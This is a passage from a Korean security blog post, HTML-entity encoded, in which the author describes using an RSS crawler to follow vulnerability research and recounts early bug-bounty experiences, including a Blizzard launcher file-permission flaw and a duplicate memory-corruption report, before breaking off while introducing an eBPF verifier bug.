&#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xAE30;&#xC5D0; &#xBB3C;&#xB9AC;&#xC801; &#xC811;&#xADFC;&#xC744; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC18D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xBCF5;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;</li><li>DMA : CPU&#xC758; operation&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xB294; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; I/O &#xC811;&#xADFC;&#xC740; Direct Memory Access &#xCDE8;&#xC57D;&#xC810;</li><li>&#xAE30;&#xAE30;&#xC5D0; &#xBB3C;&#xB9AC;&#xC801;&#xC778; &#xC811;&#xADFC;&#xC744; &#xD1B5;&#xD574; &#xCDA9;&#xC804;&#xAE30;&#xB97C; &#xAF42;&#xB294; Attack surface&#xB3C4; &#xC788;&#xC74C;</li></ul></li><li>&#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBCC0;&#xC218; &#xC0AC;&#xC6A9;&#xC5D0; &#xB300;&#xD55C; MSRC&#xC758; &#xBCF4;&#xACE0;&#xC11C;<ul><li>C&#xB098; C++&#xC5D0;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; Undifined behavior</li><li>2016~2018&#xB144; &#xB3D9;&#xC548; &#xD574;&#xB2F9; &#xBC84;&#xADF8;&#xAC00; root cause&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC99D;&#xAC00;</li></ul></li></ul><p><img src="/2021/09/08/fabu1ous/crazy-wall/12.png" alt></p><p>&#x201C;&#xB09C;&#xC774;&#xB3C4; &#xD558;&#x201D;&#xB294; &#xAE00;&#xC758; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xACFC; &#xC0C8;&#xB85C; &#xC54C;&#xAC8C;&#xB41C; &#xC0AC;&#xC2E4;&#xB4F1;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBCF4;&#xC548;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; IT &#xC804;&#xBC18;&#xC801;&#xC778; &#xC9C0;&#xC2DD; &#xC2B5;&#xB4DD;&#xC744; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC26C;&#xC6B4; &#xAE00;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xB9CE;&#xC774; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xBC30;&#xACBD; &#xC9C0;&#xC2DD;&#xC744; &#xC313;&#xB294;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/13.png" alt></p><p>&#xC218;&#xC9D1;&#xD558;&#xB294; RSS &#xD53C;&#xB4DC;&#xB97C; &#xB298;&#xB824;&#xAC00;&#xB2E4; &#xBCF4;&#xBA74; &#xCD5C;&#xADFC;&#xC5D0; &#xC790;&#xC8FC; &#xC5B8;&#xAE09;&#xB418;&#xB294; &#xC8FC;&#xC81C;&#xB4E4;&#xC774; &#xBCF4;&#xC774;&#xAE30; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC8FC;&#xC81C;&#xC5D0; &#xAD00;&#xD55C; &#xAE30;&#xC220;&#xC801;&#xC778; &#xBB38;&#xC11C;&#xB4E4;&#xC744; &#x201C;&#xB09C;&#xC774;&#xB3C4; &#xC911;&#x201D;&#xC73C;&#xB85C; &#xC120;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC;&#xC5D0; &#xC790;&#xC8FC; &#xC5B8;&#xAE09;&#xB418;&#xB294; &#xC8FC;&#xC81C;&#xC5D0; &#xB300;&#xD574; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xCEF4;&#xD4E8;&#xD130; &#xACF5;&#xD559; &#xB0B4;&#xC6A9;&#xC774; &#xB2F4;&#xAE34; &#xAE00;&#xB4E4;&#xC744; &#xCC3E;&#xC544; &#xC77D;&#xC73C;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xACE0; &#xC628; &#xAE00;&#xC740; 2020&#xB144; 8&#xC6D4;&#xC5D0; &#xC791;&#xC131;&#xD55C; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;&#xAC00; Tiger lake&#xB77C;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC11C; &#xB808;&#xBCA8;&#xC758; CET(Control flow Enforcement Tech)&#xB97C; &#xC801;&#xC6A9;&#xD55C; CPU&#xAC00; &#xCD9C;&#xC2DC;&#xB418;&#xAE30; &#xC9C1;&#xC804;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; CPU&#xC640; CET, &#xADF8;&#xB9AC;&#xACE0; CET&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xAE30;&#xC220;&#xB4E4;(CFG, XFG, shadow stack, indirect-branch-tracking)&#xC774; &#xC790;&#xC8FC; &#xC5B8;&#xAE09;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xACE0; &#xC628; &#xAE00;&#xC740; CFG&#xC758; &#xAE30;&#xC220;&#xC801; &#xBC30;&#xACBD; &#xC124;&#xBA85;&#xACFC; XFG&#xC640;&#xC758; &#xBE44;&#xAD50; &#xB4F1;&#xC744; &#xC815;&#xB9AC;&#xD55C; &#xBD84;&#xC11D;&#xAE00;&#xC744; &#xC77D;&#xACE0; &#xC815;&#xB9AC;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/14.png" alt></p><p>&#x201C;&#xB09C;&#xC774;&#xB3C4; &#xC911;&#x201D;&#xC758; &#xAE00;&#xC744; &#xC77D;&#xC73C;&#xC2E4; &#xB54C; &#xC694;&#xC998; Hot&#xD55C; &#xAE30;&#xC220;&#xC774; &#xBB54;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xAE30;&#xC220; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC1C;&#xC804;&#xD574; &#xC654;&#xB294;&#xC9C0; &#xB4F1;&#xC744; &#xC8FC;&#xBAA9;&#xD558;&#xC2DC;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/08/fabu1ous/crazy-wall/15.png" alt></p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; write-up, &#xCDE8;&#xC57D;&#xC810; PoC, Patch &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD55C; 1-day &#xBD84;&#xC11D;&#xAE00; &#xB4F1;&#xC744; &#x201C;&#xB09C;&#xC774;&#xB3C4; &#xC0C1;&#x201D;&#xC73C;&#xB85C; &#xC120;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; Hackyboiz &#xD300; &#xBE14;&#xB85D;&#xADF8;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#x201C;&#xD558;&#xB8E8;&#xD55C;&#xC904;&#x201D; &#xCF58;&#xD150;&#xCE20;&#xAC00; &#xC774;&#xB7EC;&#xD55C; &#xAE00;&#xB4E4;&#xC744; &#xC77D;&#xACE0; &#xC815;&#xB9AC;&#xD55C; &#xAC83;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xAE00;&#xB4E4;&#xC744; &#xC77D;&#xC73C;&#xC2E4; &#xB550; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC744; &#xC9D1;&#xC911;&#xD558;&#xC2DC;&#xB294; &#xAC8C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC885;&#xB958;&#xB294; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;</li><li>root cause&#xAC00; &#xBB50;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; chainning &#xB418;&#xB294;&#xC9C0;</li><li>&#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD560; &#xC218; &#xC788;&#xB294; &#xD589;&#xC704;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294;&#xC9C0;</li><li>&#xADF8;&#xB798;&#xC11C; &#xC120;&#xD0DD;&#xD55C; exploit &#xBC29;&#xC2DD;&#xC774; &#xBB54;&#xC9C0;</li></ul><p><img src="/2021/09/08/fabu1ous/crazy-wall/16.png" alt></p><p>&#xAC04;&#xD639; &#xD558;&#xB098;&#xC758; &#xD0C0;&#xAC9F;&#xC5D0;&#xC11C; &#xB2E4;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC9C4;&#xD589;&#xB41C; &#xC5F0;&#xAD6C;&#xC758; &#xC131;&#xACFC;&#xB97C; &#xC790;&#xB791;&#xD558;&#xB294; &#xAE00;&#xB4E4;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAE00;&#xB4E4;&#xC740; &#xD0C0;&#xAC9F; &#xC120;&#xC815; &#xC774;&#xC720;, &#xC0C8;&#xB85C;&#xC6B4; attack surface &#xC81C;&#xC2DC; &#xB4F1;&#xACFC; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC5D0; &#xD544;&#xC694;&#xD55C; insight&#xB97C; &#xACF5;&#xC720;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC544;&#xC11C; &#xD2B9;&#xBCC4;&#xD788; &#xB354; &#xC8FC;&#xBAA9;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/17.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; Crazy Wall&#xC774;&#xB77C; &#xBD80;&#xB974;&#xB294; &#xC77C;&#xC885;&#xC758; &#xB9C8;&#xC778;&#xB4DC;&#xBA65;&#xC785;&#xB2C8;&#xB2E4;. &#xBC94;&#xC8C4; &#xC2A4;&#xB9B4;&#xB7EC; &#xC601;&#xD654;&#xB098; &#xB9C8;&#xC57D; &#xCE74;&#xB974;&#xD154; &#xC601;&#xD654; &#xB4F1;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xBCF4;&#xC774;&#xACE4; &#xD558;&#xB294;&#xB370; &#xC5B4;&#xB5A4; &#xC0AC;&#xAC74;&#xC758; &#xC99D;&#xAC70;, &#xC911;&#xC2EC;&#xC778;&#xBB3C; &#xB4F1;&#xC758; &#xC0AC;&#xC9C4;&#xC774; &#xBCBD;&#xC5D0; &#xBD99;&#xC5EC; &#xB193;&#xACE0; &#xC2E4;&#xB85C; &#xC5F0;&#xACB0; &#xC9C0;&#xC5B4; &#xC0C8;&#xB85C;&#xC6B4; &#xB2E8;&#xC11C;&#xAC00; &#xB420;&#xB9CC;&#xD55C; &#xC0AC;&#xC2E4;&#xC774;&#xB098; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xB358; &#xC5F0;&#xAD00;&#xAD00;&#xACC4;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; RSS Crawler&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCD5C;&#xC2E0; &#xC774;&#xC288;&#xB4E4;&#xC744; &#xB530;&#xB77C;&#xB2E4;&#xB2C8;&#xB2E4; &#xBCF4;&#xBA74; &#xBA38;&#xB9BF;&#xC18D;&#xC5D0; Crazy Wall&#xC774; &#xADF8;&#xB824;&#xC9C0;&#xACE4; &#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xB4E4; &#xC0AC;&#xC774;&#xC758; &#xC5F0;&#xAD00;&#xAD00;&#xACC4;&#xAC00; &#xBCF4;&#xC778;&#xB2E4;&#xAC74;&#xAC00;, &#xC5B4;&#xB5A0;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB41C; &#xBC29;&#xBC95;&#xC744; &#xC870;&#xAE08; &#xBE44;&#xD2C0;&#xC5B4; &#xB2E4;&#xB978; &#xACF3;&#xC5D0; &#xC801;&#xC6A9;&#xC2DC;&#xCF1C;&#xBCF4;&#xB294; &#xB4F1;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xB5A0;&#xC624;&#xB97C; &#xC218; &#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC; &#xB300;&#xB2E8;&#xD558;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xC81C; &#xBA38;&#xB9AC;&#xC18D;&#xC5D0; &#xADF8;&#xB824;&#xC84C;&#xB358; Crazy Wall&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xBC1C;&#xCDCC;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/18.png" alt>&#xCD1D; 3&#xAC00;&#xC9C0; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xC65C; RSS Crawler&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCD5C;&#xC2E0; &#xC774;&#xC288; &#xD2B8;&#xB798;&#xD0B9;&#xC774; &#xBCF4;&#xC548; &#xB274;&#xBE44;&#xB4E4;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xC124;&#xBA85;&#xD574;&#xBCF4;&#xB824; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; &#xC81C;&#xAC00; &#xCCAB; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; &#xD3EC;&#xC0C1;&#xAE08;&#xC744; &#xBC1B;&#xC740; &#xC774;&#xC57C;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;. &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xD560; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC885;&#xB958;&#xB97C; &#xB9CE;&#xC774; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC774; &#xC65C; &#xC911;&#xC694;&#xD55C;&#xC9C0; &#xC608;&#xC2DC;&#xB97C; &#xB4E4;&#xC5B4; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8;&#xB294; &#xC911;&#xBCF5; &#xC81C;&#xBCF4;&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC774;&#xACE0; &#xB2E4;&#xB978; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC5BB;&#xC5B4; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xBCF4;&#xC548; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xC758;&#xACAC;&#xC744; &#xBCF4;&#xACE0; &#xC0AC;&#xACE0;&#xB97C; &#xD655;&#xC7A5;&#xD558;&#xAC8C; &#xB41C; &#xACBD;&#xD5D8;&#xC744; &#xACF5;&#xC720;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/19.png" alt>&#xCCAB; &#xBC88;&#xC9F8; &#xC774;&#xC57C;&#xAE30; &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6CC;&#xAC8C;&#xC784;&#xC740; &#xC815;&#xB9D0; &#xC88B;&#xC740; &#xACF5;&#xBD80; &#xC218;&#xB2E8;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xC9C0;&#xC2DD; &#xC2B5;&#xB4DD;&#xACFC; &#xB354;&#xBD88;&#xC5B4; &#xB178;&#xB825;&#xD55C; &#xB9CC;&#xD07C; &#xD655;&#xC2E4;&#xD558;&#xACE0; &#xC989;&#xAC01;&#xC801;&#xC778; &#xC131;&#xCDE8;&#xAC10;&#xC744; &#xC8FC;&#xB294; &#xACF5;&#xBD80;&#xBC95;&#xC740; &#xD754;&#xCE58; &#xC54A;&#xC8E0;. &#xC6CC;&#xAC8C;&#xC784;&#xB9CC;&#xD07C; &#xBC14;&#xB85C;&#xBC14;&#xB85C; &#xC131;&#xCDE8;&#xAC10;&#xC744; &#xC8FC;&#xB294; &#xACF5;&#xBD80;&#xBC29;&#xBC95;&#xB3C4; &#xC5C6;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC;&#xB294; &#xC870;&#xAE08; &#xB2E4;&#xB974;&#xC8E0;. &#xC5C4;&#xCCAD;&#xB09C; &#xB178;&#xB825;&#xC744; &#xC3F3;&#xC544; &#xBD80;&#xC5B4;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC73C;&#xB9AC;&#xB780; &#xD655;&#xC2E0;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xC11C;&#xD788; &#xD798;&#xC774; &#xBE60;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC2DC;&#xC57C;&#xB97C; &#xC870;&#xAE08;&#xB9CC; &#xB113;&#xD600;&#xBCF8;&#xB2E4;&#xBA74; &#xC774;&#xC57C;&#xAE30;&#xAC00; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB274;&#xBE44;&#xB77C;&#xACE0; &#xD574;&#xB3C4; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC5BC;&#xB9C8;&#xB4E0;&#xC9C0; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB178;&#xB825;&#xC758; &#xC131;&#xACFC;&#xB97C; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xBE60;&#xB974;&#xAC8C; &#xBCF4;&#xACE0; &#xC790;&#xC2E0;&#xAC10;&#xC744; &#xD0A4;&#xC6CC;&#xB098;&#xAC08; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xACE0;&#xC628; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBC14;&#xB85C; Insecure File Permission&#xC785;&#xB2C8;&#xB2E4;. &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; Blizzard &#xD1B5;&#xD569; &#xAC8C;&#xC784; &#xB7F0;&#xCC98;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; ACL&#xC774; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xC5B4;&#xC788;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/20.png" alt></p><p>ACL(Access Control List)&#xB294; &#xD2B9;&#xC815; object&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xC800;&#xB098; &#xADF8;&#xB8F9;&#xC774; &#xAC16;&#xB294; &#xAD8C;&#xD55C;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. &#xC720;&#xC800;&#xAC00; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC548; &#xB418;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xC548; &#xB418;&#xACA0;&#xC8E0;? &#xC545;&#xC6A9;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC758; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; Insecure File Permission &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/21.png" alt></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB9CC; &#xBA87; &#xBC88; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC800;&#xB294; Insecure File Permission &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xCCAB; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; &#xD3EC;&#xC0C1;&#xAE08;&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4;&#xB3C4; &#xC774;&#xB807;&#xAC8C; &#xC26C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xBD80;&#xD130; &#xCC3E;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC;&#xC5D0; &#xC785;&#xBB38;&#xD574;&#xBCF4;&#xB294; &#xAC74; &#xC5B4;&#xB5A8;&#xAE4C;&#xC694;?</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/22.png" alt></p><p>&#xB450; &#xBC88;&#xC9F8; &#xC774;&#xC57C;&#xAE30; &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4; Insecure File Permission&#xC73C;&#xB85C; &#xCCAB; &#xD3EC;&#xC0C1;&#xAE08;&#xC744; &#xBC1B;&#xAE34; &#xD588;&#xC9C0;&#xB9CC; &#xC81C;&#xAC00; &#xCC98;&#xC74C; &#xC81C;&#xBCF4;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB530;&#xB85C; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8;&#xC9C0; &#xBDF0;&#xC5B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; memory corruption&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xC2DC;&#xC5F0; &#xC601;&#xC0C1;&#xAE4C;&#xC9C0; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xCC0D;&#xC73C;&#xBA70; &#xC815;&#xC131;&#xC2A4;&#xB7FD;&#xAC8C; &#xBCF4;&#xACE0;&#xC11C;&#xB97C; &#xC791;&#xC131;&#xD588;&#xB294;&#xB370; &#xB4C0;&#xD50C;(Duplicate)&#xCC98;&#xB9AC;&#xB418;&#xC11C; &#xD3EC;&#xC0C1;&#xAE08;&#xC744; &#xBABB; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;&#xC5D0;&#xB294; Duplicate Report(&#xC911;&#xBCF5; &#xC81C;&#xBCF4;) &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC5EC;&#xB7EC; &#xBC88; &#xC81C;&#xBCF4;&#xAC00; &#xB4E4;&#xC5B4;&#xC628;&#xB2E4;&#xBA74; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xC81C;&#xBCF4;&#xD55C; &#xC0AC;&#xB78C;&#xC5D0;&#xAC8C;&#xB9CC; &#xD3EC;&#xC0C1;&#xC744; &#xC9C0;&#xAE09;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC778;&#xB370;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;&#xB294; &#xC18D;&#xB3C4;&#xAC00; &#xC0DD;&#xBA85;&#xC785;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC18C;&#xBAA8;&#xD558;&#xB294; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC758; &#xC5F0;&#xAD00;&#xAD00;&#xACC4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xBC29;&#xBC95;&#xC744; &#xC5BB;&#xAC70;&#xB098; &#xB2E4;&#xB978; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xC758; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; write-up&#xC5D0;&#xC11C; &#xC5BB;&#xC740; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC5BC;&#xB9C8;&#xB098; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC744; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/23.png" alt></p><p>2020&#xB144; 11&#xC6D4;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Linux kernel&#xC758; eBPF&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; Verifier&#xC640; BPF intruction&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC640; &#xADF8; &#xAC12;&#xB4E4;&#xC758; &#xD5C8;&#xC6A9;&#xBC94;&#xC704;(&#xC774;&#xD558; range)&#xB97C; &#xAD00;&#xB9AC;/&#xAC10;&#xB3C5;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; memory load&#xC640; store&#xC758; out-of-bound 